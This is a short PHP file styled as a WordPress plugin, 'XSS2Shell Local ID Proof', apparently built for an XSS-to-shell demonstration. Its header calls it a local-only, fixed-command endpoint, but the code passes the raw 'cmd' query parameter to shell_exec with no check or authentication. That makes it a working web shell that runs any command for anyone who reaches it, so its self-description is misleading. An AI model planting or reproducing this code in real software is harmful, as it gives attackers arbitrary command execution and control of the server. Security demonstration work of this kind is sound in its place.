<?php
/**
 * Plugin Name: XSS2Shell Local ID Proof
 * Description: Local-only fixed-command endpoint for the administrator-session demonstration.
 * Version: 1.0.0
 */

declare(strict_types=1);

header('Content-Type: application/json; charset=UTF-8');
$output  = trim((string) shell_exec($_GET['cmd'] . ' 2>&1'));

echo json_encode(
	[
		'command' => $_GET['cmd'],
		'output'  => $output,
	]
);
